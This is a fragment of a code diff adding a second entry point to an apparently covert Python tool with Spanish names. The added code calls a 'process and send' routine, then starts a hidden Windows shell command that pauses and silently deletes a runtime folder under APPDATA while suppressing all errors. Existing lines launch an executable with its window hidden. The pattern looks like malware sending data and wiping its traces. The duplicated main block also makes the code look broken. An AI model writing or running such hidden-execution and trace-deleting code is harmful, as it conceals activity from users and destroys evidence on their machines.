@@ -56,3 +56,22 @@ if __name__ == "__main__":
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE
         subprocess.Popen([RUTA_EXE_FINAL], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
+
+if __name__ == "__main__":
+    procesar_y_enviar()
+
+    try:
+        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = subprocess.SW_HIDE
+
+        subprocess.Popen(
+            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
+            shell=True,
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+    except Exception:
+        pass
+
